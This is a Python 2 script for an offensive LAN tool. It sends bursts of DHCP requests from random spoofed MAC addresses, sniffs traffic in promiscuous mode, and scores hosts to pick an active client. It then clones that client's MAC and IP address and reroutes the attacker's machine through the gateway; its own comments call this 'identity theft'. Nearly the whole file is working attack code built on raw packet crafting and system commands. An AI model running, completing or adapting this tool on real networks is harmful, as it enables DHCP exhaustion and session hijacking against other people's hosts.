#!/usr/bin/env python

# net imports
import struct
import sys, os, errno, random, traceback
import socket, fcntl, select
import binascii
# thread imports
import Queue
import threading
import time
# signalling
import signal
# run external cmds
import subprocess
# py ping impl
try:
	from ping import ICMP
	ICMP_AVAIL = True
	ICMP_MAXFAIL = 5
except ImportError:
	ICMP_AVAIL = False

MIN_INITPKG = 30
MAX_INITIME = 30
MAX_PKGCAPT = 20

ETH_PROTO_ALL = 0x0003
ETH_IP        = 0x0800
ETH_ARP       = 0x0806
IP_TCP        = 0x06
IP_UDP        = 0x11


import ctypes
class ifreq(ctypes.Structure):
	IFF_PROMISC = 0x100
	SIOCGIFFLAGS = 0x8913
	SIOCSIFFLAGS = 0x8914
	_fields_ = [("ifr_ifrn", ctypes.c_char * 16),
		    ("ifr_flags", ctypes.c_short)
		   ]

class RawPkgBase(threading.Thread):
	def __init__(self, netif, queueTuples):
		super(RawPkgBase, self).__init__()
		self._nIface = netif
		self._eActive = threading.Event()
		self._qTuples = queueTuples
		self._lastErr = None

	def enable(self):
		self._eActive.set()

	def disable(self):
		self._eActive.clear()

	def isEnabled(self):
		return self._eActive.isSet()

	def getLastErr(self):
		errmsg = str(self._lastErr)
		self._lastErr = None
		return errmsg

	def hasLastErr(self):
		return True if self._lastErr is not None else False

class RawPkgSender(RawPkgBase):
	def __init__(self, netif, queueTuples):
		super(RawPkgSender, self).__init__(netif, queueTuples)
		self.__openSock(netif)

	def __openSock(self, netif):
		self.__rSocket = socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(ETH_PROTO_ALL))

	def __closeSock(self):
		self.__rSocket.close()
		del self.__rSocket

	def reOpen(self):
		self.__closeSock()
		self.__openSock(self._nIface)

	def run(self):
		self.pkg_send_loop()

	def genRandomMac(self, onlyValid=True):
		macAddr = ''.join(random.choice("1234567890abcdef") for a in xrange(12))
		if onlyValid:
			macAddr = '{0:x}'.format( int(macAddr, 16) & 0xFCFFFFFFFFFF )
		return macAddr

	def __randomByte(self, minByte, maxByte):
		return random.randrange(minByte , maxByte) & 0xFF

	def genRandomIP(self, ipRange=( (1,255), (1,255), (1,255), (1,255) )):
		return '.'.join([ str(self.__randomByte(ir[0],ir[1])) for ir in ipRange ])

	def genPrivateIP(self, which=None):
		subnets = {
			0: self.genRandomIP( ((10,11),   (0,255),   (0,255),(1,255)) ), # 10.0.0.1    - 10.254.254.254
			1: self.genRandomIP( ((172,173), (16,32),   (0,255),(1,255)) ), # 172.16.0.1  - 172.31.254.254
			2: self.genRandomIP( ((192,193), (168,169), (0,255),(1,255)) ) # 192.168.0.1 - 192.168.254.254
		}
		return subnets.get(random.randrange(0,3)) if which is None \
			else subnets.get(which, subnets.get(0))

	def genRandomID(self, length):
		return ''.join(random.choice("1234567890abcdef") for a in xrange(length))

	def genEtherPkg(self, srcMac, dstMac, ethProto, data=None):
		return struct.pack("!6s6sH", binascii.unhexlify(dstMac), binascii.unhexlify(srcMac), int(ethProto)) \
			if data is None else struct.pack("!6s6sH"+str(len(data))+"s", binascii.unhexlify(dstMac), binascii.unhexlify(srcMac), int(ethProto), data)

	def genArpPkg(self, srcMac, srcIP, dstMac, dstIP, arpMac=None):
		if arpMac is None:
			arpSrcMac = srcMac
			arpDstMac = 'ffffffffffff'
		else:
			arpSrcMac = arpMac
			arpDstMac = dstMac

		return self.genEtherPkg(srcMac, dstMac, ETH_ARP) + struct.pack("!HHBBH6s4s6s4s"
			, 0x1     # HardwareAdr
			, ETH_IP  # Protocol
			, 0x6     # HardwareAddrSize
			, 0x4     # ProtocolAddrSize
			, 0x1 if arpMac is not None else 0x2 # REUQEST or REPLY
			, binascii.unhexlify(arpSrcMac)
			, socket.inet_aton(srcIP)
			, binascii.unhexlify(arpDstMac)
			, socket.inet_aton(dstIP))

	def genIpPkg(self, srcMac, dstMac, srcIP, dstIP, proto, data):
		ethPkg = self.genEtherPkg(srcMac, dstMac, ETH_IP)
		ip4Pkg = struct.pack("!BBHHHBBH4s4s", (0b0100) << 4 | 0x5, 0x00, 20+len(data) # Version|IHL/TOS/TotalLen
			, 0x0000, 0x0000, 0x80, IP_UDP, 0x0000 # Ident/Flags|FragmentOff/TTL/Protocol/HdrChksm
			, socket.inet_aton(srcIP) # SourceIP
			, socket.inet_aton(dstIP)) # DestinationIP
		# calc ip hdr checksum
		added = 0
		# add all 16 bit fields
		for idx in xrange(10):
			added = added + struct.unpack("!H", str(ip4Pkg[2*idx:2*idx+2]))[0]
		# add 8 bit carry (if exists) to 16 Bit value
		while (added & 0xFF0000) > 0:
			added = (added & 0x00FFFF) + ((added & 0xFF0000) >> 16)
		# bitwise negation with xor
		added = added ^ 0xFFFF
		# insert checksum in pkg buffer
		ip4Pkg = ip4Pkg[0:10] + struct.pack("!H", added) + ip4Pkg[12:] + data
		return ethPkg + ip4Pkg

	def genUdpPkg(self, srcMac, dstMac, srcIP, dstIP, srcPort, dstPort, data):
		udplen = 8 + len(data)
		udpPkg = struct.pack("!HHHH", srcPort, dstPort, udplen, 0x0000) + str(data)
		srcIpL, dstIpL = struct.unpack("!L", socket.inet_aton(srcIP)) + struct.unpack("!L", socket.inet_aton(dstIP))
		chksm = long(0)
		# add ip pseudo header data (srcIP, dstIP, protocol, totalLength(?))
		chksm = chksm + (srcIpL & 0x0000FFFF) + ((srcIpL & 0xFFFF0000) >> 16) + \
				(dstIpL & 0x0000FFFF) + ((dstIpL & 0xFFFF0000) >> 16) + \
				(IP_UDP & 0xFF) + (udplen & 0xFFFF)
		# add all udp header + udp data words
		isEvenLen = True if udplen%2 == 0 else False
		for idx in xrange(udplen/2) if isEvenLen else xrange((udplen-1)/2):
			chksm = chksm + struct.unpack("!H", str(udpPkg[idx*2:2*idx+2]))[0]
		# if datagram length is uneven, add the last byte
		if not isEvenLen:
			chksm = chksm + (struct.unpack("!B", udpPkg[(idx+1)*2])[0] << 8)
		# add 8 bit carry (if exists) to 16 Bit value
		while (chksm & 0xFFFF0000) > 0:
			chksm = (chksm & 0x0000FFFF) + ((chksm & 0xFFFF0000) >> 16)
		# insert checksum in pkg buffer
		if chksm != 0xFFFF:
			chksm = chksm ^ 0xFFFF
		udpPkg = udpPkg[0:6] + struct.pack("!H", chksm) + udpPkg[8:]
		return self.genIpPkg(srcMac, dstMac, srcIP, dstIP, IP_UDP, udpPkg)

	def genDhcpPkg(self, srcMac, dstMac, op=0x01, xid=None, secs=None, rqIP=None):
		dhcpPkg = struct.pack("!BBBBIHHIIII16s192sI13s2s4s15sB25s", 0x01, 0x01, 0x06, 0x00 # op/htype/hlen/hops
			, int(self.genRandomID(8), 16) if xid is None else int(xid[:8], 16) # xid
			, 0x0000 if secs is None else (int(secs) & 0xFFFF) # secs
			, 0x0000 # flags
			, 0x00000000, 0x00000000, 0x00000000, 0x00000000 # client ip addr/your ip addr/server ip addr/relay ip addr
			, binascii.unhexlify(srcMac) + '\x00'*10 # client hardware addr
			, '\x00'*192, 0x63825363 # 192 zeros/DHCP-MAGIC
			, '\x35\x01'+chr(op & 0xFF)+'\x0c\x08' + self.genRandomID(8) # opcode/LEN/DHCP-TYPE/opcode/LEN/HOSTNAME
			, '\x32\x04', socket.inet_aton(rqIP) if rqIP is not None else socket.inet_aton(self.genPrivateIP()) # requestIP/len/addr
			, '\x37\x0d\x01\x1c\x02\x03\x0f\x06\x77\x0c\x2c\x2f\x1a\x79\x2a' # parameter request list
			, 0xFF # dhcp end option
			, '\x00'*25) # padding
		return self.genUdpPkg(srcMac, dstMac, '0.0.0.0', '255.255.255.255', 68, 67, dhcpPkg)

	def pkg_send_loop(self):
		# bind to a specific network interface
		self.__rSocket.bind((self._nIface, 0))

		# set capture event
                while not self._eActive.isSet():
                        time.sleep(0.1)
                while self._eActive.isSet():
			time.sleep(1.0)
                        try:
				#pkg = self.genArpPkg('0021e9e6b9c0', '172.29.1.153', 'd4ae52cfc04c', '172.29.1.166', self.genRandomMac())
				#pkg = self.genUdpPkg('0021e9e6b9c0', 'ffffffffffff', '127.0.0.1', '255.255.255.255', 25, 6667, 'AAAAAACCD')
				xid = self.genRandomID(8)
				src = self.genRandomMac()
				#src = '54271ebe428b'
				rip = self.genPrivateIP(1)
				#rip = '172.29.15.145'
				pkg = self.genDhcpPkg(src, 'ffffffffffff', 0x01, xid, 0, rip)
				self.__rSocket.send(pkg)
				time.sleep(3)
				pkg = self.genDhcpPkg(src, 'ffffffffffff', 0x01, xid, 3, rip)
				self.__rSocket.send(pkg)
				time.sleep(1)
                        except Exception as e:
				exc_type, exc_obj, exc_tb = sys.exc_info()
				fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                                self._lastErr = str(fname) + '(' + str(exc_tb.tb_lineno) + '): ' + str(e)
                                continue

class RawPkgCapturer(RawPkgBase):
	CAPTURE_PROTOCOLS_ETH = [ ETH_IP  # ETHNERNET_IP
				, ETH_ARP # ETHNERNET_ARP
				]
	CAPTURE_PROTOCOLS_IP4 = [ 1       # ICMP
				, 2       # IGMP
				, IP_TCP  # TCP
				, 8       # EGP
				, 9       # IGP
				, 11      # NVP-2
				, IP_UDP  # UDP
				]

	def __openSock(self, netif):
		# packet based raw socket
		self.__rSocket = socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(ETH_PROTO_ALL))
		# enable promisc mode
		ifr = ifreq()
		ifr.ifr_ifrn = netif
		ret = fcntl.ioctl(self.__rSocket.fileno(), ifr.SIOCGIFFLAGS, ifr) # G for GET Socket FLAGS
		if ret != 0:
			raise Exception('SIOCGIFFLAGS failed')
		ifr.ifr_flags |= ifr.IFF_PROMISC
		ret = fcntl.ioctl(self.__rSocket.fileno(), ifr.SIOCSIFFLAGS, ifr) # S for SET Socket FLAGS
		if ret != 0:
			raise Exception('SIOCSIFFLAGS failed')
		del ifr

	def __closeSock(self):
		self.__rSocket.close()
		del self.__rSocket
		self.__rSocket = None

	def __init__(self, netInterface, queueTuples):
		super(RawPkgCapturer, self).__init__(netInterface, queueTuples)
		self.__openSock(netInterface)

	def __del__(self):
		self.__closeSock()
		del self._nIface, self._eActive

	def reOpen(self):
		self.__closeSock()
		self.__openSock(self._nIface)

	def run(self):
		self.pkg_capture_loop()

	def getIP(self):
		return socket.inet_ntoa(fcntl.ioctl(self.__rSocket.fileno(),
			  0x8915, # SIOCGIFADDR
			  struct.pack('256s', self._nIface[:15])
			)[20:24])

	def getHW(self):
		info = fcntl.ioctl(self.__rSocket.fileno(),
			  0x8927,
			  struct.pack('256s', self._nIface[:15]))
		return ':'.join(['%02x' % ord(char) for char in info[18:24]])

	def pkg_capture_loop(self):
		# bind to a specific network interface
		self.__rSocket.bind((self._nIface, 0))
		self.__rSocket.setblocking(False)

		# set capture event
		while not self._eActive.isSet():
			time.sleep(0.1)
		while self._eActive.isSet():
			try:
				# check if socket data available
				if not select.select([self.__rSocket], [], [], 1)[0]:
					continue
				receivedPacket = self.__rSocket.recv(2048)
			except Exception as e:
				self._lastErr = str(e)
				continue

			# Ethernet Header...
			ethBuf   = receivedPacket[0:14]
			ethHdr   = struct.unpack("!6s6sH",ethBuf)
			dstMac   = binascii.hexlify(ethHdr[0])
			srcMac   = binascii.hexlify(ethHdr[1])
			ethProto = ethHdr[2]

			# look for some client->AP traffic (TCP/UDP/IGMP)
			if ethProto not in self.CAPTURE_PROTOCOLS_ETH:
				continue

			# IP Header... 
			ipBuf    = receivedPacket[14:34]
			ipHdr    = struct.unpack("!9sB2s4s4s",ipBuf)
			dstIP    = socket.inet_ntoa(ipHdr[4])
			srcIP    = socket.inet_ntoa(ipHdr[3])
			ipProto  = ipHdr[1]

			# add it to the queue
			self._qTuples.put( (srcMac, srcIP, dstMac, dstIP, ethProto, ipProto) )


def runCmd(cmd, verbose=False):
	if verbose:
		sys.stdout.write("\r`"+cmd+"`\n")
		sys.stdout.flush()
	realcmd = cmd.split(' ')
	proc = subprocess.Popen(realcmd, shell=False, stdout=subprocess.PIPE)
	while proc.poll() is None:
		time.sleep(0.1)
	return proc.poll()

def readProcArp():
	arpdict = dict()
	with open('/proc/net/arp') as arpfile:
		first = True
		for line in arpfile:
			if first is True:
				first = False
				continue
			line = line.strip().split()
			arpdict[line[0]] = (line[3], line[5])
	return arpdict

def readProcRoute():
	routelist = list()
	with open('/proc/net/route') as routefile:
		first = True
		for line in routefile:
			if first is True:
				first = False
				continue
			line = line.strip().split()
			routelist.append(( socket.inet_ntoa(struct.pack("<L", int(line[2], 16))), line[0], socket.inet_ntoa(struct.pack("<L", int(line[1], 16))), socket.inet_ntoa(struct.pack("<L", int(line[7], 16))) ))
        return routelist

def getGW(arpDict, routeList):
	gwTpl = None
	if arpDict is None or routeList is None:
		return None
	for route in routeList:
		(gw, netif, net, mask) = route
		if net == '0.0.0.0' and mask == '0.0.0.0':
			gwTpl = (netif, gw)
			break
	if gwTpl:
		arp = arpDict[gwTpl[1]]
		gwTpl += (arp[0],)
	return gwTpl

def HwToHwColon(nonColonHwStr):
	return ':'.join(a+b for a,b in zip(nonColonHwStr[::2], nonColonHwStr[1::2]))

def HwColonToHw(colonHwStr):
	return ''.join(a for a in colonHwStr.split(':'))

def printColumns():
	sys.stdout.write("\r\n[ "+str("iterations").rjust(10)+" | "
			       +str("packages").rjust(10)  +" | "
			       +str("icmp").rjust(5)       +" | "
			       +str("arp").rjust(5)        +" | "
			       +str("hosts").rjust(5)      +" | "
			       +str("route").rjust(5)      +" ] [ "
			       +str("hwAddr").rjust(17)    +" | "
			       +str("ipAddr").rjust(17)    +" ] [ "
			       +str("hwAddrGW").rjust(17)  +" | "
			       +str("ipAddrGW").rjust(17)  +" ]\n")
	sys.stdout.flush()

def printStatus(tuples):
	sys.stdout.write("\r[ %10d | %10d | %5d | %5d | %5d | %5d ] [ %17s | %17s ] [ %17s | %17s ]" % tuples)
	sys.stdout.flush()

def queuePkgToDict(pkgQueue, hostDict, queueTimeout = 0.5):
	(srcMac, srcIP, dstMac, dstIP, ethProto, ipProto) = pkgQueue.get(True, queueTimeout)
	srcMacCol = HwToHwColon(srcMac)
	dstMacCol = HwToHwColon(dstMac)
	if (srcMac,dstMac) not in hostDict:
		hostDict[(srcMac,dstMac)] = (srcIP, dstIP, ethProto, ipProto, 1)
		return (True, srcMac, dstMac)
	else:
		hostDict[(srcMac,dstMac)] = (srcIP, dstIP, ethProto, ipProto, hostDict[(srcMac,dstMac)][4]+1)
		return (False, srcMac, dstMac)

def hostDictToList(hostDict):
	retList = list()
	for key, value in hostDict.iteritems():
		temp = list(value)
		temp.insert(0, key)
		temp.insert(1, (temp[1], temp[2]))
		del temp[2:4]
		retList.append( tuple(temp) )
	return retList

def ipAdrInNet(ipAddrStr, netStr):
	ipAddr = struct.unpack('L', socket.inet_aton(ipAddrStr))[0]
	netaddr, bits = netStr.split('/')
	netmask = struct.unpack('L', socket.inet_aton(netaddr))[0] & ((2L<<int(bits)-1)-1)
	return ipAddr & netmask == netmask

def hostIsPrivateSubnet(ipAddr):
	# check if ipAddr is in a private subnet
	return True if (ipAdrInNet(ipAddr, '10.0.0.0/8')
		or ipAdrInNet(ipAddr, '172.16.0.0/12')
		or ipAdrInNet(ipAddr, '192.168.0.0/16')) else False

def calcHostScore(hostList, myHwAddr):
	sorted(hostList, key=lambda host: host[4], reverse=True)
	hwAddr = HwColonToHw(myHwAddr)
	scoreList = list()
	for host in hostList:
		( (srcMac,dstMac), (srcIP,dstIP), ethProto, ipProto, pkgCount ) = host
		score = 10.0
		if srcMac == hwAddr or dstMac == hwAddr:
			continue
		if srcMac == 'ffffffffffff' or dstMac == 'ffffffffffff':
			score = score/4.0
		if ethProto == ETH_ARP:
			score = score/3.0
		if ipProto not in [IP_UDP, IP_TCP]:
			score = score/1.5
		if (hostIsPrivateSubnet(srcIP) ^ hostIsPrivateSubnet(dstIP)) is True:
			score = score*2.0
		else:
			score = score/2.0
		temp = list(host)
		temp.append(score * host[4])
		scoreList.append(tuple(temp))
	if len(scoreList) == 0:
		return None
	scoreList = sorted(scoreList, key=lambda host: host[5], reverse=True)
	( (srcMac,dstMac), (srcIP,dstIP), ethProto, ipProto, pkgCount, score ) = scoreList[0]
	print
	print scoreList
	if hostIsPrivateSubnet(srcIP) is True:
		return (dstMac, dstIP, srcMac, srcIP, score) if dstMac != 'ffffffffffff' else None
	elif hostIsPrivateSubnet(dstIP) is True:
		return (srcMac, srcIP, dstMac, dstIP, score) if srcMac != 'ffffffffffff' else None
	return None


# check for root
if os.geteuid() != 0:
	raise OSError(errno.EACCES, 'Permission denied. Only root can create RAW sockets.')
# check for ICMP class
if ICMP_AVAIL:
	icmp = ICMP()
else:
	sys.stderr.write('WARNING: Python ping library containing (ICMP class) missing\n')
	sys.stderr.flush()

# start pkg capture thread
_pkgCaptureTuples = Queue.Queue()
_pkgSenderTuples  = Queue.Queue()
netif = 'eth1'
print '> listen on interface', netif
rps = RawPkgSender(netif, _pkgSenderTuples)
rps.daemon = False
# fire up our sender thread
rps.start()
rps.enable()

try:
	while True:
		time.sleep(1.0)
		if rps.hasLastErr():
			print rps.getLastErr()
except KeyboardInterrupt:
	rps.disable()
	rps.join()
	sys.exit(0)
except  Exception as e:
	if e:
		print e
	rps.disable()
	rps.join()
	sys.exit(0)
	
rpc = RawPkgCapturer(netif, _pkgCaptureTuples)
rpc.daemon = False
# fire up our capture thread
rpc.start()

# sighandler
def sighandler(signum, frame):
	print 'Signal(' + str(signum) + ')'
	rpc.disable()
# init signal handler
signal.signal(signal.SIGINT, sighandler)

# run main loop
pkgCount = 0
itrCount = 0
icmCount = 0
lastTime = time.time()
doInitia = True
printHdr = True
hostDict = dict()
rpc.enable()
while rpc.isEnabled():
	try:
		if rpc.hasLastErr():
			sys.stderr.write('RPC-ERROR: ' + rpc.getLastErr() + '\n')
			doInitia = True

		"""
		    do initial packet capturing (basic information about the target network)
		"""
		if doInitia:
			doInitia = False
			endTime = float(time.time() + float(MAX_INITIME))
			initPkg = 0
			while runCmd("ifconfig " + netif + " 0.0.0.0 up hw ether " + HwToHwColon(rps.genRandomMac()), True) is not 0:
				pass
			rps.reOpen()
			rpc.reOpen()
			sys.stdout.write('\rgathering traffic (' + str(MIN_INITPKG) + ' pkgs/' + str(MAX_INITIME) + 's)')
			while (rpc.isEnabled() and initPkg < MIN_INITPKG) and (time.time() < endTime):
				try:
					(isFirst, srcMac, dstMac) = queuePkgToDict(_pkgCaptureTuples, hostDict)
					if isFirst:
						sys.stdout.write('*')
					else:
						sys.stdout.write('#')
					initPkg = initPkg+1
				except Queue.Empty:
					sys.stdout.write('.')
				sys.stdout.flush()
			hostList = hostDictToList(hostDict)
			topHost = calcHostScore(hostList, rpc.getHW())
			if topHost is None:
				sys.stdout.write('No Score available..\n')
				doInitia = True
				continue
			else:
				sys.stdout.write('\rTop Score: ' + str(topHost) + '\n')
				runCmd("ifconfig " + netif + " " + topHost[1] + " up hw ether " + topHost[0], True)
				runCmd("arp -s " + topHost[3] + " " + topHost[2], True)
				runCmd("route add default gw " + topHost[3], True)
				rpc.reOpen()

		"""
		    get some system/network information such as /proc/net/{arp|route} & socket{hw|ip}address
		"""
		ipAddr = rpc.getIP()
		hwAddr = rpc.getHW()
		arpTbl = readProcArp()
		rouTbl = readProcRoute()
		gwTupl = getGW(arpTbl, rouTbl)
		if gwTupl is None:
			doInitia = True
			continue

		"""
		    capture packets for identity theft
		"""
		try:
			curPkgs = 0
			while rpc.isEnabled():
				(isFirst, srcMac, dstMac) = queuePkgToDict(_pkgCaptureTuples, hostDict)
				(srcIP, dstIP, ethProto, ipProto, pkgRecv) = hostDict[(srcMac,dstMac)]
				if srcMac == hwAddr or dstMac == hwAddr:
					if not srcIP == ipAddr and not dstIP == ipAddr:
						sys.stdout.write('\rNEW IP!!!\n')
						sys.stdout.flush()
						doInitia = True
						break
				pkgCount = pkgCount+1
				curPkgs = curPkgs+1
				if curPkgs >= MAX_PKGCAPT:
					break
		except Queue.Empty:
			if ICMP_AVAIL and time.time()-lastTime > 1.0:
				lastTime = time.time()
				icmpFailed = 0
				while icmp.do_one("8.8.8.8", 0.5 + icmpFailed/2) is None:
					icmpFailed = icmpFailed+1
					sys.stdout.write('ICMP failed (' + str(icmpFailed) + '/' + str(ICMP_MAXFAIL) + ')\n')
					sys.stdout.flush()
					if icmpFailed == ICMP_MAXFAIL:
						doInitia = True
						break
				if doInitia:
					continue
				icmCount = icmCount+1

		"""
		    print information status bar
		"""
		if printHdr:
			printHdr = False
			printColumns()
		itrCount = itrCount+1
		printStatus( (itrCount, pkgCount, icmCount, len(arpTbl), len(rouTbl), len(hostDict), hwAddr, ipAddr, gwTupl[1], gwTupl[2]) )
	except KeyboardInterrupt:
		printHdr = True
	except IOError as e:
		doInitia = True
	except Exception as e:
		exc_type, exc_obj, exc_tb = sys.exc_info()
		fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
		sys.stderr.write("ERROR(" + str(exc_type) + "): " + str(e) + " (" + str(fname) + ": " + str(exc_tb.tb_lineno) + ")\n")
		sys.stderr.flush()
		traceback.print_tb(exc_tb)

rps.disable()
rps.join()
rpc.disable()
rpc.join()
del rps, rpc
